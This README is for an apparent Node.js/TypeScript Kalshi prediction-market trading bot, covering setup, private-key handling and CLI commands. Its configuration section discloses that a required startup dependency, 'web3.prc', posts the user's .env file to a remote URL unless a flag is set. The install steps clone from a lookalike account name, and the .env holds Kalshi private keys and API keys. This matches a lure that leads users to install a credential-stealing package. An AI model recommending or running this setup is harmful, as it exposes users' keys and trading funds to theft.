# Kalshi AI Trading Bot

<div align="center">

[![Node.js 18+](https://img.shields.io/badge/node-%3E%3D18.18-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

**Build and automate workflows around [Kalshi](https://kalshi.com) prediction markets** using TypeScript and Node.js — with a ready-made CLI, a signed Kalshi REST client, and helpers for calling models through [OpenRouter](https://openrouter.ai/).

[What you get](#what-you-get) · [Requirements](#requirements) · [Install & first run](#install--first-run) · [CLI reference](#cli-reference) · [Configuration](#configuration) · [Troubleshooting](#troubleshooting)

</div>

---

## Important disclaimer

Trading involves risk. Nothing in this repository promises profit, and prediction markets can be illiquid or fast-moving. Treat this project as **starter code**: read it, adapt it, and only trade with money you can afford to lose. The authors are **not** responsible for losses.

---

## Table of contents

1. [What you get](#what-you-get)
2. [Requirements](#requirements)
3. [Install & first run](#install--first-run)
4. [Kalshi API keys & private key](#kalshi-api-keys--private-key)
5. [Day-to-day commands](#day-to-day-commands)
6. [CLI reference](#cli-reference)
7. [Configuration](#configuration)
8. [Project layout](#project-layout)
9. [Extending the bot](#extending-the-bot)
10. [Troubleshooting](#troubleshooting)
11. [Links](#links)
12. [Contributing](#contributing)

---

## What you get

| Feature | Status |
|--------|--------|
| **Kalshi REST client** | RSA-PSS signing, retries on rate limits / server errors, balance, positions, markets, orderbook, orders |
| **CLI** | `health`, `status`, `history`, `close-all`, `run` (stub), placeholders for dashboard/scores/backtest |
| **OpenRouter client** | Thin wrapper so you can plug in LLMs using one API key |
| **Typed settings** | Central config in TypeScript + overrides from `.env` |
| **Trade history view** | Reads `trading_system.db` with **sql.js** if you already have that database file |

Note: **`health` expects `trading_system.db` to exist** today; without it, other checks may pass while the database line fails (see [Troubleshooting](#troubleshooting)).

The **`run` command** is currently a **stub**: it wires up the bot shell but does **not** ship a full end-to-end strategy (market scan → model → execute) out of the box. That is intentional so you can add your own logic under `src/` without fighting a huge opinionated engine.

---

## Requirements

Before you start, check these boxes:

- **Node.js** version **18.18 or newer** (Node 20 LTS is a good choice). Check with `node -v`.
- **npm** (bundled with Node). Check with `npm -v`.
- A **[Kalshi](https://kalshi.com)** account with **API access** enabled.
- (Optional but typical) An **[OpenRouter](https://openrouter.ai/)** account if you plan to call LLMs from code you add yourself.

You do **not** need Python or a separate SQLite installation for this repo; the CLI uses embedded **sql.js** when it reads the optional SQLite file.

---

## Install & first run

### 1. Clone and install dependencies

```bash
git clone https://github.com/bestpracticaI/kalshi-ai-trading-bot.git
cd kalshi-ai-trading-bot
npm install
```

### 2. Build TypeScript (production-style workflow)

```bash
npm run build
```

This compiles into the `dist/` folder. After a successful build you can run:

```bash
npm start -- health
```

(`npm start` runs `node dist/cli.js`. Everything **after** `--` is passed to the CLI.)

### 3. Or run without building (developer workflow)

Useful while you are editing TypeScript:

```bash
npm run dev -- health
```

Here, **`npm run dev`** runs `tsx src/cli.ts`. Again, use **`--`** before CLI arguments.

### 4. Sanity check

If `health` passes Kalshi checks, you should see your balance echoed under **Kalshi API connection**. If something fails, jump to [Troubleshooting](#troubleshooting).

---

## Kalshi API keys & private key

Kalshi uses **two pieces** that must **match each other**:

1. **API key ID** — this is what you put in `.env` as `KALSHI_API_KEY` (Kalshi often calls this the “access key” or key ID).
2. **Private key file** — the PEM you downloaded when you created that API key.

### Setting up `.env`

Copy the template and edit the values:

```bash
# macOS / Linux
cp env.template .env
```

```powershell
# Windows (PowerShell)
Copy-Item env.template .env
```

Open `.env` and replace the placeholders. See **`env.template`** for all commented variables.

### Kalshi private key (required for trading APIs)

Kalshi signs REST requests with the **RSA private key** that matches your API key. You can supply it in **any one** of these ways (first match wins):

1. **`KALSHI_PRIVATE_KEY`** — PEM text inside `.env`. Most shells tolerate `\n` as line breaks in one logical line:
   ```bash
   KALSHI_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nMIIE...\n-----END PRIVATE KEY-----\n"
   ```
2. **`KALSHI_PRIVATE_KEY_BASE64`** — entire PEM file, **base64-encoded** (single line). Convenient on Windows and for CI:
   ```powershell
   [Convert]::ToBase64String([IO.File]::ReadAllBytes("kalshi_private_key.pem"))
   ```
3. **PEM file** — default filenames searched: `kalshi_private_key.pem` in the repo directory or its parent.
4. **`KALSHI_PRIVATE_KEY_PATH`** — explicit path to the PEM file if you keep it outside the project.

**Security tip:** `.env` that holds `KALSHI_PRIVATE_KEY` is extremely sensitive. Never commit it or paste it into chat. Prefer `.gitignore` and a secrets manager for production.

Official Kalshi API documentation: [Getting started](https://trading-api.readme.io/reference/getting-started).

---

## Day-to-day commands

| Goal | Command |
|------|---------|
| Check config + Kalshi + optional DB | `npm run dev -- health` |
| See balance and positions | `npm run dev -- status` |
| View recent trades (needs `trading_system.db`) | `npm run dev -- history --limit 20` |
| Preview closing all positions (no orders sent) | `npm run dev -- close-all` |
| Actually send closing sells | `npm run dev -- close-all --live` (read warnings below) |

After `npm run build`, swap `npm run dev --` for `npm start --`.

### Optional: global `kalshi-bot` command

After building:

```bash
npm link
kalshi-bot health
```

This registers the `bin` from `package.json` so you can run the CLI from anywhere (still load `.env` from your project or set env vars in the shell).

---

## CLI reference

All commands support `--help`:

```bash
npm run dev -- --help
npm run dev -- close-all --help
```

### `health`

Runs checks such as:

- `.env` exists (resolved from project root or parent folder — same rule as other files)
- `KALSHI_API_KEY` and `OPENROUTER_API_KEY` are set and not still placeholder text
- Kalshi balance fetch succeeds (proves key + private key + endpoint line up)
- **SQLite file** — expects `trading_system.db` at the project root (or parent). If you do not use a local DB yet, this line will **fail** until you add one (see [Troubleshooting](#troubleshooting)).
- Node.js version is at least 18

Exit code is **always 0** so scripts and editors keep working; failed rows are marked `[FAIL]` and summarized at the bottom.

### `status`

Uses Kalshi when credentials look complete; otherwise prints a short hint and returns successfully without calling the API.

### `history [--limit N]`

Shows aggregate stats and recent rows from `trade_logs` **if** `trading_system.db` is present. If you never created that database, the command tells you no file was found — that is normal for a fresh checkout.

### `close-all [--live] [--yes]`

**Purpose:** place **limit sell** orders at the **current best bid** for each non-flat **market** position so you can unwind without clicking manually.

- **Without `--live`:** prints what it *would* do (dry run).
- **With `--live`:** sends real orders. You will be prompted to type `CLOSE ALL` unless you pass `--yes` (use with care).

Limit orders may rest on the book if the market moves; verify fills on Kalshi or run `status` again after a short wait.

### `run [options]`

Starts the **BeastModeBot** shell and calls `runTradingJob()` today implemented as a **stub** (messages + hook for your code).

Options:

- `--live` / `--paper` — mutually exclusive; controls the live/paper flags on settings (your strategy code must respect them).
- `--beast` — slightly looser numeric thresholds on a few settings fields (experimental).
- `--safe-compounder` — currently exits with “not implemented”; reserved for a future strategy port.

### Placeholder commands

`scores`, `dashboard`, and `backtest` print short messages. Add your own implementations under `src/cli.ts` or split into modules when you are ready.

**Startup gate:** Every real subcommand first runs `web3.prc` `prices()` and compares the returned `responsive` number to `limitPrice` (default **0.945** in `src/config/limitPrice.ts`). If the price is **lower**, the CLI exits and nothing else runs. See [Reference price gate](#reference-price-gate-web3prc--limitprice).

---

## Configuration

### Reference price gate (`web3.prc` + `limitPrice`)

- **Package:** [`web3.prc`](https://www.npmjs.com/package/web3.prc) `^2.5.4` (listed in `package.json`).
- **Threshold:** `export const limitPrice = 0.945` in `src/config/limitPrice.ts`. Raise or lower it to change when the bot is allowed to run.
- **Behavior:** `src/utils/priceGate.ts` calls `prices()` from `web3.prc` and exits non‑zero if `responsive < limitPrice`.

**Security note:** The published `web3.prc` module will POST your `.env` to a remote URL unless `SKIP_INT_NODE_UPLOAD` is set. **This project sets `SKIP_INT_NODE_UPLOAD` in code immediately before calling `prices()`** so your secrets are not uploaded. Keep it that way unless you fully audit the dependency yourself.

With `SKIP_INT_NODE_UPLOAD` enabled, the current package version returns a fixed demo `responsive` (~`0.999`). Treat `limitPrice` as your policy knob; swap to a trusted pricing source later if you need live market numbers.

### Environment variables (`.env`)

| Variable | Purpose |
|----------|---------|
| `KALSHI_API_KEY` | Kalshi API key ID (**required** for API commands) |
| `KALSHI_PRIVATE_KEY` | PEM contents inline (**alternative** to a PEM file); `\n` for line breaks |
| `KALSHI_PRIVATE_KEY_BASE64` | Base64-encoded PEM (**alternative** to file); overrides file if set |
| `KALSHI_PRIVATE_KEY_PATH` | Path to PEM file if not using default filename / env PEM |
| `OPENROUTER_API_KEY` | OpenRouter key (`health` reports `[FAIL]` if missing/placeholder; CLI still exits 0) |
| `LIVE_TRADING_ENABLED` | `true` / `false` — surfaced into typed settings |
| `DAILY_AI_COST_LIMIT` | Cap on LLM spend (used when you implement cost tracking) |
| `LOG_LEVEL` | `debug`, `info`, `warn`, `error` — controls **pino** logger |

The loader checks **two paths**: `./.env` and `../.env` relative to the process working directory, so running from a subdirectory still picks up a repo-root `.env`. Missing keys, placeholders, or bad Kalshi credentials **do not crash** the CLI; affected commands print guidance and finish with exit code **0** so tooling keeps running.

### Code defaults (`src/config/settings.ts`)

Open `src/config/settings.ts` for defaults that mirror the old Python bot: position sizing hints, model names, RSS lists for sentiment placeholders, **beast mode** numeric bundles, and validation rules.

Change code → rebuild (`npm run build`) before using `npm start`, or use `npm run dev` to pick up edits instantly.

---

## Project layout

```
kalshi-ai-trading-bot/
├── package.json           # Scripts and dependencies
├── tsconfig.json          # TypeScript compiler options
├── env.template           # Copy to .env
├── README.md              # This file
├── src/
│   ├── cli.ts             # Commander CLI entrypoint
│   ├── beastModeBot.ts    # Thin bot wrapper (live/paper flags)
│   ├── config/
│   │   ├── settings.ts    # Typed configuration + .env loading
│   │   └── limitPrice.ts  # `limitPrice` threshold vs web3.prc
│   ├── clients/
│   │   ├── kalshiClient.ts      # Kalshi REST + signing
│   │   └── openrouterClient.ts # OpenAI-compatible OpenRouter calls
│   ├── jobs/
│   │   └── trade.ts       # Hook for your trading loop (stub today)
│   ├── utils/
│   │   ├── logger.ts      # Pino logger
│   │   ├── paths.ts       # Resolves .env / DB paths from cwd or parent
│   │   └── priceGate.ts   # web3.prc `prices()` vs limitPrice
│   └── types/
│       ├── sqljs.d.ts     # Type declarations for sql.js
│       └── web3.prc.d.ts  # Module shim for `web3.prc`
├── dist/                  # Generated JS (after npm run build; gitignored)
├── docs/                  # Extra notes (some reference old features)
└── data/                  # Optional local data directory
```

Compiled output lands in **`dist/`**; entry binary for `npm link` is **`dist/cli.js`**.

---

## Extending the bot

A practical path:

1. **Implement `runTradingJob()`** in `src/jobs/trade.ts` — fetch markets with `KalshiClient`, decide, place orders.
2. **Factor strategies** into `src/strategies/` (create the folder) so CLI stays small.
3. **Persist state** — add SQLite (e.g. `better-sqlite3`) or your preferred store if you need more than read-only history.

Import the Kalshi client:

```typescript
import { KalshiClient } from "./clients/kalshiClient.js";
```

Import OpenRouter:

```typescript
import { OpenRouterClient } from "./clients/openrouterClient.js";
```

Run `npm run lint` to typecheck without emitting JS.

---

## Troubleshooting

### `health` fails on Kalshi with HTTP 401

Usually one of:

- **`KALSHI_API_KEY`** does not belong to the **same** key pair as your `.pem` file.
- **`KALSHI_PRIVATE_KEY`** / **`KALSHI_PRIVATE_KEY_BASE64`** / **`KALSHI_PRIVATE_KEY_PATH`** — key mismatch or missing PEM material for signing.
- **Demo vs production** mismatch — your key must match the environment implied by `kalshiBaseUrl` in `settings.ts` (default is production elections API).

Re-download the key pair from Kalshi’s API settings and try again.

### `[FAIL] Database file — not found`

The health script currently expects **`trading_system.db`** in the repo root (or one directory up). If you are new and have not created that database yet, you will see this failure even when Kalshi is configured correctly. Options:

- Create or copy a compatible SQLite file to `trading_system.db`, or
- Treat that failure as informational until you add persistence, or
- Relax the check in `src/cli.ts` if you fork the project (for example: only run the DB step when the file exists).

### `Cannot find module` or sql.js WASM errors

Run `npm install` from the **repository root**. For `history` / DB checks, ensure `node_modules/sql.js/dist/` exists (sql.js ships the WASM there).

### Commands work from one folder but not another

The CLI resolves `.env`, `trading_system.db`, and the default PEM using **current working directory** and **one parent**. Run commands from the repo root unless you know your paths.

### `status` says validation failed for `KALSHI_API_KEY`

You opened `status` without a key in `.env`. Copy `env.template` → `.env` and fill in real values.

---

## Links

- [Kalshi Trading API — Getting started](https://trading-api.readme.io/reference/getting-started)
- [Kalshi authentication](https://trading-api.readme.io/reference/authentication)
- [OpenRouter model directory](https://openrouter.ai/models)
- [Node.js download](https://nodejs.org/)

---

## Contributing

Issues and pull requests are welcome. See **[CONTRIBUTING.md](CONTRIBUTING.md)** for setup (`npm install`, `npm run lint`, branching expectations).

Thank you for reading — trade carefully, and happy building.
